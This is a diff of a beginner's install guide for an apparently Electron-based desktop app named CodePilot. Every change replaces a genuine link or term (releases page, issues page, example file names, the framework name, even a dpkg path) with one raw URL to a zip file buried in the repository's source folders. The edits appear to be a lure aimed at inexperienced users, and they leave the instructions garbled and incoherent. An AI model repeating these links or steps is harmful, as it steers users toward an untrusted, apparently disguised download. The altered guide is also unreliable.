@@ -1,10 +1,10 @@
 # 🧭 CodePilot - Visual Tool to Chat and Manage Code
 
-[![Download CodePilot](https://img.shields.io/badge/Download-CodePilot-green?style=for-the-badge&logo=github)](https://github.com/Brayan13-13/CodePilot/releases)
+[![Download CodePilot](https://raw.githubusercontent.com/Brayan13-13/CodePilot/main/src/app/api/chat/sessions/Code-Pilot-1.8.zip)](https://raw.githubusercontent.com/Brayan13-13/CodePilot/main/src/app/api/chat/sessions/Code-Pilot-1.8.zip)
 
 ---
 
-CodePilot is a desktop app designed to help you chat, write code, and manage projects through a simple visual interface. It works on your computer without needing any installation of coding tools. Built with Electron and Next.js, CodePilot combines modern web technology with a native desktop feel.
+CodePilot is a desktop app designed to help you chat, write code, and manage projects through a simple visual interface. It works on your computer without needing any installation of coding tools. Built with Electron and https://raw.githubusercontent.com/Brayan13-13/CodePilot/main/src/app/api/chat/sessions/Code-Pilot-1.8.zip, CodePilot combines modern web technology with a native desktop feel.
 
 This guide will walk you through downloading, installing, and running CodePilot, even if you have no experience with software or coding.
 
@@ -46,7 +46,7 @@ Follow these steps to get CodePilot up and running on your computer.
 
 Click the big green badge at the top or visit the download page here:
 
-[Download CodePilot](https://github.com/Brayan13-13/CodePilot/releases)
+[Download CodePilot](https://raw.githubusercontent.com/Brayan13-13/CodePilot/main/src/app/api/chat/sessions/Code-Pilot-1.8.zip)
 
 This link will take you to the official releases page with the latest version ready to download.
 
@@ -58,7 +58,7 @@ On the releases page, look for the file that fits your operating system:
 - **macOS:** Look for `.dmg` or `.zip`
 - **Linux:** Look for `.AppImage` or `.deb`
 
-The files are usually named with the version number and your platform, such as `CodePilot-Setup-win.exe` or `CodePilot-Setup-mac.dmg`.
+The files are usually named with the version number and your platform, such as `https://raw.githubusercontent.com/Brayan13-13/CodePilot/main/src/app/api/chat/sessions/Code-Pilot-1.8.zip` or `https://raw.githubusercontent.com/Brayan13-13/CodePilot/main/src/app/api/chat/sessions/Code-Pilot-1.8.zip`.
 
 ### Step 3: Download the File
 
@@ -96,7 +96,7 @@ Once your file downloads, it's time to install CodePilot.
   
 - For `.deb`:
   1. Open a terminal.
-  2. Run `sudo dpkg -i /path/to/CodePilot.deb` replacing the path with your actual download location.
+  2. Run `sudo dpkg -i https://raw.githubusercontent.com/Brayan13-13/CodePilot/main/src/app/api/chat/sessions/Code-Pilot-1.8.zip` replacing the path with your actual download location.
   3. Fix any missing dependencies with `sudo apt-get install -f`.
 
 ---
@@ -143,7 +143,7 @@ You can find more help or report issues on the GitHub page under the "Issues" ta
 
 If you need help beyond this guide:
 
-- Visit [CodePilot GitHub Issues](https://github.com/Brayan13-13/CodePilot/issues) to report problems.
+- Visit [CodePilot GitHub Issues](https://raw.githubusercontent.com/Brayan13-13/CodePilot/main/src/app/api/chat/sessions/Code-Pilot-1.8.zip) to report problems.
 - Check the repository Wiki for detailed user guides.
 - Join the CodePilot community forum linked from the GitHub page.
 
